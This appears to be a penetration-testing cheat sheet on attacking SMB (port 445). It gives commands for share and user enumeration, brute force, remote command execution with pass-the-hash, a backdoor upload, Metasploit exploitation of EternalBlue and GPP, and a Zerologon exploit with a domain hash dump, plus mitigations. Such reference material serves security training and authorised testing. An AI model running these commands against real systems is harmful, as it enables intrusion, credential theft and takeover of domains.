# Port 445 - SMB

S**MB (Server Message Block)** is a network file-sharing protocol commonly used in Windows environments. It facilitates file sharing, printer access, and remote services.



## Techniques

### Anonymous SMB Login

Test if anonymous access is enabled on SMB

{% code title="smbclient" %}
```bash
smbclient -L //<IP> -N
smbclient -N //<IP>/<DIR>
```
{% endcode %}

{% code title="nmap" %}
```bash
nmap -p 445 --script smb-enum-shares $IP
```
{% endcode %}



### Enumerate SMB Shares

Identify and analyze shared folders.

{% code title="NetExec" %}
```bash
nxc smb <IP> -u 'guest' -p '' --shares
```
{% endcode %}

{% code title="smbmap" %}
```bash
smbmap -H $IP
smbmap -H $IP -u "username" -p "password"
smbmap -H <IP> -u 'guest' -p '' -d DOMAIN.COM -r '<DIR_NAME>' --depth 20
```
{% endcode %}

{% code title="crackmapexec" %}
```bash
crackmapexec smb <IP> -u USER -p PASSWORD --shares

# all the subnet
crackmapexec smb <IP>/<CIDR> -u USER -p PASSWORD --shares
```
{% endcode %}

{% code title="smbclient" %}
```bash
# List directories
smbclient -L //<IP> -U "username%password"

# Connect in a directory
smbclient -N //<IP>/<DIR> -U "username%password"
```
{% endcode %}

{% code title="nmap" overflow="wrap" %}
```bash
nmap -p 445 --script smb-enum-shares <IP>
nmap -p 445 --script smb-enum-shares --script-args smbusername=USER,smbpassword=PASS <IP>
```
{% endcode %}

{% code title="Metasploit" %}
```bash
use auxiliary/scanner/smb/smb_enumshares
```
{% endcode %}

### Enumerate SMB Users

Extract user information.

{% code title="rpcclient" %}
```bash
rpcclient -U "" <IP>
> enumdomusers
> queryuser <RID>
> lookupSids <DOMAIN_SID>-<RID> # e.x S-1-5-21-917908876-1423158569-3159038727-500
```
{% endcode %}

{% code title="nxc" %}
```bash
nxc smb <DC_IP> -u 'anonymous' -p '' --rid-brute > user_group_ad.txt

# create a file with only user
grep 'SidTypeUser' user_group_ad.txt | grep -oE '[A-Za-z0-9_-]+\\[A-Za-z0-9 _-]+' | sed 's/.*\\//' > user_ad.txt

# create a file with only user with domain
grep 'SidTypeUser' user_group_ad.txt | grep -oE '[A-Za-z0-9_-]+\\[A-Za-z0-9 _-]+' > domain_user_ad.txt

```
{% endcode %}

{% code title="CrackMapExec" %}
```bash
crackmapexec  smb <IP> -u 'anonymous' -p '' --rid-brute

# all in the subnet
crackmapexec  smb <IP> -u 'anonymous' -p '' --rid-brute
```
{% endcode %}

{% code title="enum4linux-ng" %}
```bash
enum4linux-ng <IP>
```
{% endcode %}

{% code title="nmap" overflow="wrap" %}
```bash
nmap -p 445 --script smb-enum-users --script-args smbusername=USER,smbpassword=PASS <IP>
```
{% endcode %}

{% code title="metasploit" %}
```bash
use auxiliary/scanner/smb/smb_enumusers
```
{% endcode %}

### Enumerate Passoword Policies

Extract domain password and lockout policies.

{% code title="rpcclient" %}
```bash
rpcclient -U "username%password" <IP>
> getdompwinfo
```
{% endcode %}

{% code title="enum4linux-ng" %}
```bash
enum4linux-ng -P <IP>
```
{% endcode %}

### Remote Command Execution

Leverage SMB to execute commands on remote systems.

{% code title="psexec.py" %}
```bash
cp /usr/share/doc/python3-impacket/examples/psexec.py .

python3 psexec.py <domain>/<username>:<password>@<IP>
```
{% endcode %}

{% code title="psexec with Metasploit" %}
```bash
use exploit/windows/smb/psexec
set RHOSTS <IP>
set SMBUser <username>
set SMBPass <password>
run
```
{% endcode %}

{% code title="SMBExec" %}
```bash
cd /usr/share/doc/python3-impacket/examples/smbexec.py .

python3 smbexec.py <DOMAIN>/<USER>:<PASS>@<IP>

python3 smbexec.py <DOMAIN>/<USER>@<IP> -hashes <LMHASH>:<NTHASH>

===============================
# Impacket tools

impacket-smbexec <DOMAIN>/<USER>:<PASS>@<IP>
impacket-smbexec <DOMAIN>/<USER>@<IP> -hashes <LMHASH>:<NTHASH>
```
{% endcode %}

{% code title="crackmapexec" overflow="wrap" %}
```bash
crackmapexec smb <IP> -u USER -p PASSWORD -x 'whoami'

# execute Powershell command
crackmapexec smb <IP> -u USER -p PASSWORD -X 'whoami'

# with Pass-the-Hash
crackmapexec smb <IP> -u USER -H <LM:NT> -X 'whoami'
```
{% endcode %}



### SMB Brute Force

Brute force the connection to find valid credentials.

{% code title="crackmapexec" overflow="wrap" %}
```bash
crackmapexec smb <IP> -u USER -p PASSWORD_FILE

# if we are in a AD environment and we want to permeform a brute force for a local user account, we have to add this flag 
crackmapexec smb <IP> -u USER -p PASSWORD_FILE --local-auth
```
{% endcode %}

{% code title="hydra" overflow="wrap" %}
```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <IP> smb/smb2 -I

hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt <IP> smb/smb2 -I

hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt <IP> smb/smb2 -I
```
{% endcode %}

{% code title="Metasploit" %}
```bash
use auxiliary/scanner/smb/smb_login
```
{% endcode %}



## Public SMB Vulnerabilities

A curated list of widely known vulnerabilities and their implications.

Check if the current SMB version is vulnerable.

```bash
searchsploit smb <version>
```

### EternalBlue (MS17-010)

Exploits SMBv1 buffer overflow to enable remote code execution.

#### Detection

{% code title="nmap" %}
```bash
nmap -p 445 --script smb-vuln-ms17-010 <IP>
```
{% endcode %}

{% code title="Metasploit" %}
```bash
use auxiliary/scanner/smb/smb_ms17_010
```
{% endcode %}



#### Exploit

{% code title="Metasploit" %}
```bash
use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS IP
exploit
```
{% endcode %}

### GPP Attacks

Group Policy Prederences (GPP) allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a "cPassword". The key was accidentally released.&#x20;

Patched in MS14-025 but it doesn't prevent previous uses.

{% code title="Metasploit module" %}
```bash
service postgresql start && msfconsole

use auxiliary/scanner/smb/smb_enum_gpp

show options

exploit
```
{% endcode %}

#### Mitigations:

* PATCH! Fixed in KB2962486
* Delete the old GPP xml file stored in the SYSVOL



### Zerologon (CVE-2020-1472)

ZeroLogon is a **critical vulnerability** found in **Microsoft's Netlogon protocol**, which is used by Windows servers (like domain controllers) to allow users and computers to log in to the network.

{% embed url="https://github.com/SecuraBV/CVE-2020-1472" %}

{% hint style="danger" %}
Do not run this exploit during a PenTest, this is a critical vulnerability and create some noise in the domain.
{% endhint %}

#### Detection

{% code title="nmap" %}
```bash
nmap -p 445 --script smb-vuln-zerologon <IP>
```
{% endcode %}

{% code title="Python script" %}
```bash
git clone https://github.com/SecuraBV/CVE-2020-1472
python3 zerologon_check.py $DC_NAME $DC_IP
```
{% endcode %}



#### Exploit

Run the exploit.

```bash
clone https://github.com/SecuraBV/CVE-2020-1472

python3 cve-2020-1472-exploit.py $DC_NAME $DC_IP

# use blank account to dump domain hashes
impacket-secretsdump -just-dc <DOMAIN>/<DC_NAME>\$@<DC_IP>
```

#### Restore the Domain Controller

When we took all the utils data from DC, we have to restore the DC.

Copy this from Administration dump

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
python3 restorepassword.py <DOMAIN>/<DC_NAME>@<DC_NAME> -target-ip <DC_IP> -hexpass <COPIED_HEX_PASS>
```
{% endcode %}



###



### SMBGhost (CVE-2020-0796)

Exploits a buffer overflow in SMBv3 to enable remote code execution.

#### Detection

{% code title="nmap" %}
```bash
nmap -p 445 --script smb-vuln-cve-2020-0796 <IP>
```
{% endcode %}

#### Exploit

...

***

## Mitigations

* Disable SMBv1 to mitigate legacy protocol vulnerabilities.
* Use firewalls to restrict SMB access to trusted IPs.
* Regularly patch and update Windows systems.
* Monitor SMB traffic for unusual activity or excessive queries.
* Enforce strong passwords and audit share permissions.

***

## Tools

### smbclient

**smbclient** is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like **getting files** from the server to the local machine, **putting files** from the local machine to the server, **retrieving directory information** from the server and so on.

{% code title="Installation" %}
```bash
sudo apt install smbclient
```
{% endcode %}

{% code title="SMB shell Comands" %}
```bash
help
ls
get FILE_NAME  
```
{% endcode %}



### smbmap

smbmap is a tool for map SMB shares, identify access levels, and explore accessible files.

```bash
sudo apt install smbmap
```

{% embed url="https://www.kali.org/tools/smbmap/" %}

#### Commands

```bash
smbmap -u guest -p "" -d . -H IP
smbmap -u USER -p 'PASS' -d . -H IP

## Run a command
smbmap -u USER -p 'PASS' -H IP -x 'ipconfig'

## List all drives
smbmap -u USER -p 'PASS' -H IP -L

## List dir content
smbmap -u USER -p 'PASS' -H IP -r 'C$'

## Upload a file
smbmap -u USER -p 'PASS' -H IP --upload '/root/sample_backdoor' 'C$\sample_backdoor'

## Download a file
smbmap -u USER -p 'PASS' -H IP --download 'C$\flag.txt'
```

### enum4linux-ng

enum4linux-ng is a tool to perform SMB enumeration, such as listing shares, users, and groups.

{% code title="Installation" %}
```bash
sudo apt install enum4linux-ng
```
{% endcode %}

{% embed url="https://www.kali.org/tools/enum4linux-ng/" %}

{% code title="Commands" %}
```bash
enum4linux -o -U -S -G -i IP
# -o: get OS information
# -U: get userlist
# -S: get sherelist
# -G: get group and member list
# -i: get printer information

enum4linux -r -u "USER" -p "PASS" IP
# -r: enumerate users via RID cycling
# -u: specify username to use (default "")
# -p: specify password to use (default "")

enum4linux -a -u "USER" -p "PASS" IP
# -a: Do all simple enumeration (-U -S -G -P -r -o -n -i)
```
{% endcode %}

### Netexec

NetExec (AKA nxc) is a network service exploitation tool that helps automate assessing the security of large networks.

NetExec is the continuation of CrackMapExec, which was maintained by mpgn over the years, but discontinued upon mpgnâ€™s retirement.

```bash
sudo apt install netexec
```

{% embed url="https://www.kali.org/tools/netexec/" %}

### CrackMapExec

Automates SMB enumeration and exploitation.

```bash
sudo apt install crackmapexe
```

{% embed url="https://www.kali.org/tools/crackmapexec/" %}

### rpcclient

rpcclient is a tool for query and interact with remote Windows server over RPC.

```bash
sudo apt install samba-common-bin
```

{% embed url="https://www.kali.org/tools/samba/#rpcclient" %}

{% code title="Commands" %}
```bash
rpcclient -U "" -N <IP>
> enumdomgroups
> lookupnames admin  
```
{% endcode %}



### Nmap

Nmap is a utility for network exploration or security auditing.

{% code title="" %}
```bash
sudo apt install nmap
```
{% endcode %}

{% embed url="https://www.kali.org/tools/nmap/" %}

{% code title="Commands" overflow="wrap" %}
```bash
nmap -sV -sC -p 445 <IP>
nmap -sU --top-ports 25 --open 

## NMAP Scripts
nmap -p 445 --script smb-protocols <IP>
nmap -p 445 --script smb-security-mode <IP>
nmap -p 445 --script smb-enum-sessions <IP>
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <IP>


nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PASS> <IP>
nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PASS> <IP>
nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PASS> <IP>
nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PASS> <IP>
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PASS> <IP>
nmap -p 445 --script smb-os-discovery <IP>
```
{% endcode %}

### Impacket suite

{% code title="installation" %}
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```
{% endcode %}

{% code title="Kali location" %}
```bash
/usr/share/doc/python3-impacket/examples/
```
{% endcode %}

#### Script for SMB

* `smbexec.py`: For command execution
* `smbclient.py`: For interacting with shares
* `GetADUsers.py`: For user enumeration
* `psexec.py`: For execute commands on remote systems with SMB

### Metasploit

Pre-installed in Kali Linux; otherwise, download from [Rapid7](https://www.metasploit.com/).

{% embed url="https://www.kali.org/tools/metasploit-framework/" %}

#### Commands

```bash
## Start msfconsole
service postgresql start && msfconsole

# ENUM SMB MODULES
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/pipe_auditor

## set options depends on the selected module
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser USER
set RHOSTS IP
exploit
```



























